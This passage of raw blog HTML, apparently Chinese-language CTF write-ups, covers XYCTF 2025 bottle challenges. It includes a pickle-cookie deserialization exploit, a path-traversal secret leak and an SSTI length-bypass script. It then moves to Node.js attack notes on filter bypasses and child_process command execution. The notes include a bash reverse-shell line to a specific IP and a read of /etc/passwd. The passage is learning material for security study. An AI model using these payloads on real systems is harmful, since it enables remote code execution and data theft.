class="string">            	从cookie中提取出签名和消息部分</span></span><br><span class="line"><span class="string">				value[1:]跳过开头的叹号</span></span><br><span class="line"><span class="string">				split(&#x27;?&#x27;, 1)按照问号分割，只分割一次</span></span><br><span class="line"><span class="string">				map(tob, ...)将分割后的签名和消息转换为字节格式（tob函数假设将字符串转换为字节）</span></span><br><span class="line"><span class="string">				&quot;&quot;&quot;</span></span><br><span class="line">            <span class="comment"># 使用相同的密钥和哈希算法对消息部分重新计算签名</span></span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 比较计算出的签名和cookie中的签名是否一致</span></span><br><span class="line">            <span class="comment"># _lscmp是一个安全的字符串比较函数，防止时序攻击</span></span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                <span class="comment"># 签名验证通过，解码消息部分</span></span><br><span class="line">                <span class="comment"># 先用base64解码，再用pickle反序列化		!!!注意这里使用了反序列化!!!</span></span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查反序列化后的数据是否有效，并且第一个元素是否与key匹配</span></span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="comment"># 返回cookie的实际值(存储在第二个元素中)</span></span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果任何验证步骤失败，返回默认值</span></span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果没有提供secret，直接返回cookie值或默认值</span></span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>
<p>总结1:我们上面有对cookie的验证,并且其中有一个pickle.loads,其会进行反序列化,而<code>reduce</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>reduce</code>魔法函数内植入恶意代码的方式进行任意命令执行.下面我们就要构造cookie,并且通过get_cookie的验证,让恶意代码到达反序列化那一步</p>
<p><strong>set_cookie</strong><br>
在bottle模板中，与get_cookie对应的就是set_cookie，一个构造cookie，一个验证cookie。也就是说如果我们要利用get_cookie进行pickle反序列化执行我们的代码，我们就要利用set_cookie来构造cookie通过get_cookie的验证。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">self, name, value, secret=<span class="literal">None</span>, digestmod=hashlib.sha256, **options</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._cookies:</span><br><span class="line">            <span class="variable language_">self</span>._cookies = SimpleCookie()</span><br><span class="line">        <span class="keyword">if</span> py &lt; (<span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>):</span><br><span class="line">            Morsel._reserved.setdefault(<span class="string">&#x27;samesite&#x27;</span>, <span class="string">&#x27;SameSite&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> secret:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">                depr(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&quot;Pickling of arbitrary objects into cookies is &quot;</span></span><br><span class="line">                            <span class="string">&quot;deprecated.&quot;</span>, <span class="string">&quot;Only store strings in cookies. &quot;</span></span><br><span class="line">                            <span class="string">&quot;JSON strings are fine, too.&quot;</span>)</span><br><span class="line">            encoded = base64.b64encode(pickle.dumps([name, value], -<span class="number">1</span>))</span><br><span class="line">            sig = base64.b64encode(hmac.new(tob(secret), encoded,</span><br><span class="line">                                            digestmod=digestmod).digest())</span><br><span class="line">            value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">self, name, value, secret=<span class="literal">None</span>, digestmod=hashlib.sha256, **options</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    设置一个 Cookie，可选择签名保护数据完整性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        name (str): Cookie 的名称（键）。</span></span><br><span class="line"><span class="string">        value (str|any): Cookie 的值。如果使用签名（secret），建议仅存储字符串。</span></span><br><span class="line"><span class="string">        secret (str): 用于签名的密钥。如果提供，Cookie 值会被签名保护。</span></span><br><span class="line"><span class="string">        digestmod: 哈希算法，默认为 hashlib.sha256。</span></span><br><span class="line"><span class="string">        **options: 其他 Cookie 属性（如 expires, path, domain 等）。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 Cookie 存储对象（如果尚未初始化）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._cookies:</span><br><span class="line">        <span class="variable language_">self</span>._cookies = SimpleCookie()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 兼容性处理：Python &lt; 3.8 时，确保 SimpleCookie 支持 &#x27;samesite&#x27; 属性</span></span><br><span class="line">    <span class="keyword">if</span> py &lt; (<span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>):</span><br><span class="line">        Morsel._reserved.setdefault(<span class="string">&#x27;samesite&#x27;</span>, <span class="string">&#x27;SameSite&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果提供了签名密钥（secret），对 Cookie 值进行签名保护</span></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># 警告：不建议对非字符串对象进行序列化（安全风险）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">            depr(<span class="number">0</span>, <span class="number">13</span>, </span><br><span class="line">                <span class="string">&quot;Pickling of arbitrary objects into cookies is deprecated.&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Only store strings in cookies. JSON strings are fine, too.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 序列化数据：将 (name, value) 元组用 pickle 序列化，并用 base64 编码</span></span><br><span class="line">        encoded = base64.b64encode(pickle.dumps([name, value], -<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 计算签名：使用 HMAC 对编码后的数据生成签名</span></span><br><span class="line">        sig = base64.b64encode(</span><br><span class="line">            hmac.new(</span><br><span class="line">                tob(secret),      <span class="comment"># 密钥转换为 bytes</span></span><br><span class="line">                encoded,          <span class="comment"># 编码后的数据作为消息</span></span><br><span class="line">                digestmod=digestmod  <span class="comment"># 哈希算法（默认 sha256）</span></span><br><span class="line">            ).digest()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 构造最终的 Cookie 值格式：`!签名?数据`</span></span><br><span class="line">        value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将 Cookie 设置到响应头（通过 SimpleCookie 对象）</span></span><br><span class="line">    <span class="variable language_">self</span>._cookies[name] = value</span><br><span class="line">    <span class="keyword">for</span> key, val <span class="keyword">in</span> options.items():</span><br><span class="line">        <span class="variable language_">self</span>._cookies[name][key] = val</span><br></pre></td></tr></table></figure>
<p>总结2:题目当中有sectet,只要我们拥有了secret,那么我们就可以构造cookie和恶意代码</p>
<p>拿secret:题目的路由@route(‘/download’)当中是有漏洞的,我们可以通过/download?filename=./…/./…/secret.txt拿到secret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hell0_H@cker_Y0u_A3r_Sm@r7</span><br></pre></td></tr></table></figure>
<p>构造反序列化代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ccatflag():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&gt;1.txt&#x27;).read()&quot;))</span><br></pre></td></tr></table></figure>
<p>生成cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=ccatflag()</span><br><span class="line">response.set_cookie(&quot;name&quot;,c,secret=&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;)</span><br><span class="line">print(reponse.set_cookie)</span><br></pre></td></tr></table></figure>
<p>完整exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from bottle import Bottle, request, response,run, route</span><br><span class="line"></span><br><span class="line">class ccatflag():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&gt;1.txt&#x27;).read()&quot;,))</span><br><span class="line">	</span><br><span class="line">c=ccatflag()</span><br><span class="line">response.set_cookie(&quot;name&quot;,c,secret=&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;)</span><br><span class="line">print(response._cookies)</span><br></pre></td></tr></table></figure>
<p>最后再到这里读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?filename=1.txt</span><br><span class="line"></span><br><span class="line">XYCTF&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出题人已疯">出题人已疯</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>根据注释知道:flag在/flag文件当中</p>
<p><code>/</code>默认路由:返回hello,world<br>
<code>/attack</code>路由:接受get组payload参数<br>
如果有payload,其中没有<code>open</code>和<code>\\</code>字样,同时payload的长度小于25</p>
<p>他使用了bottle.template,那么就存在ssti漏洞</p>
<p>那么我们就需要绕过,然后拿到flag</p>
<p>思路:通过os模块添加一个属性a,给a赋值为python代码,然后执行这个代码来拿到flag<br>
为什么选择os?原因1:os可以自定义属性(这里自定义了一个属性a)原因2:<code>os</code> 是 Python 的一个<strong>内置标准库模块</strong>，提供与操作系统交互的功能</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">其实关键就在限制长度<span class="number">25</span>这里</span><br><span class="line">因为<span class="built_in">open</span>不让用,我们可以使用&gt;将输出流重定向到一个文件当中</span><br><span class="line"></span><br><span class="line">那么限制长度怎样绕过呢?</span><br><span class="line">我们最终是要向属性a当中输入<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /f*&gt;123&#x27;</span>)</span><br><span class="line">我们可以将其分开,分割为数组[<span class="string">&#x27;__i&#x27;</span>, <span class="string">&#x27;mpo&#x27;</span>, <span class="string">&#x27;rt_&#x27;</span>, <span class="string">&quot;(&#x27;o&quot;</span>, <span class="string">&quot;s&#x27;)&quot;</span>, <span class="string">&#x27;.sy&#x27;</span>, <span class="string">&#x27;ste&#x27;</span>, <span class="string">&quot;m(&#x27;&quot;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27; /f&#x27;</span>, <span class="string">&#x27;*&gt;1&#x27;</span>, <span class="string">&quot;23&#x27;)&quot;</span>]</span><br><span class="line">然后通过+=来一个个地拼接</span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__&quot;</span></span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__im&quot;</span></span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__impo&quot;</span></span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__import&quot;</span></span><br><span class="line"> ...</span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;12&quot;</span></span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;123&#x27;&quot;</span></span><br><span class="line"> \n%<span class="keyword">import</span> os;os.a=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;123&#x27;)&quot;</span></span><br><span class="line"> 然后通过os的<span class="built_in">eval</span>来执行一下属性a</span><br><span class="line"> 然后include拿flag</span><br></pre></td></tr></table></figure>
<p>官方的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">3</span>)]</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">    r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>nodejs</title>
    <url>/2025/03/16/nodejs/</url>
    <content><![CDATA[<h1>难点</h1>
<p><strong>原型链</strong></p>
<h1>nodejs</h1>
<h1>特性</h1>
<h2 id="弱类型比较">弱类型比较</h2>
<p>和php一样存在弱类型的特性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; <span class="number">1</span>==<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; <span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="string">&#x27;111&#x27;</span>&lt;<span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>数字与数字字符串比较时，数字型字符串会被强转为数字之后比较<br>
字符串与字符串比较，比第一个ASCII码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; []==[]</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; []&gt;[]</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; [<span class="number">1</span>,<span class="number">3</span>]&gt;[<span class="number">5</span>]</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; [<span class="number">11</span>,<span class="number">45</span>]&gt;<span class="string">&#x27;aaa&#x27;</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; [<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; [<span class="number">11</span>,<span class="number">12</span>]&lt;<span class="string">&quot;10&quot;</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>空数组比较为false<br>
数组之间比较第一个值，如果有字符串取第一个比较<br>
数组永远比非数值型字符串小</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; <span class="literal">null</span>==<span class="literal">undefined</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="literal">null</span>===<span class="literal">undefined</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; <span class="title class_">NaN</span>==<span class="title class_">NaN</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">&gt; <span class="title class_">NaN</span>===<span class="title class_">NaN</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>null弱等于undefined，NaN不等于NaN</p>
<hr>
<h2 id="变量拼接">变量拼接</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; <span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line"><span class="string">&#x27;56,6&#x27;</span></span><br><span class="line">&gt; <span class="string">&quot;5&quot;</span>+<span class="number">6</span></span><br><span class="line"><span class="string">&#x27;56&#x27;</span></span><br><span class="line">&gt; <span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line"><span class="string">&#x27;56,6&#x27;</span></span><br><span class="line">&gt; <span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]</span><br><span class="line"><span class="string">&#x27;56,6&#x27;</span></span><br></pre></td></tr></table></figure>
<p>数字或字符串跟数组，会和数组中的第一个元素进行拼接，返回的是字符串，拼接的元素与原来的元素之间用<code>,</code>分隔</p>
<p>调用方法时可以用<code>中括号 + 字符串</code>的形式拼接来绕过某些限制</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; <span class="variable language_">console</span>[<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;og&#x27;</span>](<span class="string">&#x27;ciallo&#x27;</span>)</span><br><span class="line">ciallo</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="ES6模板字符串">ES6模板字符串</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ranker = <span class="string">&quot;top&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello %s&quot;</span>,kino);</span><br></pre></td></tr></table></figure>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231015113637396.png" alt="image-20231015113637396"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`hello<span class="subst">$&#123;ranker&#125;</span>world`</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231015113814528.png" alt="image-20231015113814528"></p>
<p>利用模板字符串或许可以用来bypass一些关键词的过滤</p>
<hr>
<h2 id="单引号和反引号">单引号和反引号</h2>
<p>在nodejs中反引号可以用来替代单引号</p>
<h2 id="大小写特性">大小写特性</h2>
<p>对于<code>toUpperCase()</code>：字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”</p>
<p>对于<code>toLowerCase()</code>：字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)</p>
<hr>
<h2 id="filename">__filename</h2>
<blockquote>
<p><strong>__filename</strong> 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是当前模块文件的路径。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出全局变量 __filename 的值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( __filename );</span><br></pre></td></tr></table></figure>
<h2 id="dirname">__dirname</h2>
<blockquote>
<p><strong>__dirname</strong> 表示当前执行脚本所在的目录，即js文件所在文件夹的路径</p>
</blockquote>
<h1>命令执行</h1>
<p><a href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback">更多方法请移步官方文档</a></p>
<h2 id="eval">eval()</h2>
<p>和PHP中eval函数一样，eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
<p>demo：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">a</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">a</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="child-process">child_process</h2>
<blockquote>
<p>nodejs中用来执行系统命令的模块</p>
</blockquote>
<p>以下几个函数底层均为调用 spawn</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(file, args, &#123;</span><br><span class="line">  <span class="attr">cwd</span>: options.<span class="property">cwd</span>,</span><br><span class="line">  <span class="attr">env</span>: options.<span class="property">env</span>,</span><br><span class="line">  <span class="attr">gid</span>: options.<span class="property">gid</span>,</span><br><span class="line">  <span class="attr">uid</span>: options.<span class="property">uid</span>,</span><br><span class="line">  <span class="attr">shell</span>: options.<span class="property">shell</span>,</span><br><span class="line">  <span class="attr">windowsHide</span>: !!options.<span class="property">windowsHide</span>,</span><br><span class="line">  <span class="attr">windowsVerbatimArguments</span>: !!options.<span class="property">windowsVerbatimArguments</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="exec-execSync">exec() &amp; execSync()</h3>
<p>本地测试上面 eval 的那个demo</p>
<p>Node.js中的<code>chile_process.exec</code>调用的是 <code>bash.sh</code> ，它是一个bash解释器，可以执行系统命令。</p>
<p>在eval函数的参数中可以构造<code>require('child_process').exec('');</code>来进行调用。</p>
<p>尝试弹计算器</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629165142909.png" alt="image-20230629165142909"></p>
<p>反弹shell：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/115.236.153.170/14723 &lt;&amp;1&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="execFile">execFile()</h3>
<blockquote>
<p>启动一个子进程来执行可执行文件</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>可以执行文件，也可以像这样调用指令，执行文件指的是执行exe这样的，而不是执行js文件</p>
<h3 id="fork">fork()</h3>
<blockquote>
<p>用于执行 js 文件</p>
</blockquote>
<p>实际利用中需要提前写入恶意文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">fork</span>(<span class="string">&quot;./hacker.js&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>Javascript</p>
<h3 id="spawn-spawnSync">spawn() &amp; spawnSync()</h3>
<blockquote>
<p>启动一个子进程来执行命令</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawn</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;execSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;e&#x27;</span>%2b<span class="string">&#x27;xecSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure>
<p>注：上述的<code>exec</code>、<code>spawn</code>、<code>fork</code>等等都是分为同步和异步的，所谓异步也就是不堵塞程序的执行，因此也不可能会有回显，因此一般我们用的都是同步的命令执行来获取回显，如<code>execSync</code>，<code>spawnSync</code>等等</p>
<h3 id="readdirSync">readdirSync</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取当前目录信息</span><br><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;./&#x27;)</span><br><span class="line"></span><br><span class="line">读取flag</span><br><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;./&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="readFileSync">readFileSync</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;/etc/passwd&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line">后面的utf-8是可选的。</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="过滤require">过滤require</h2>
<p>现在我们添加一点过滤，把require过滤掉</p>
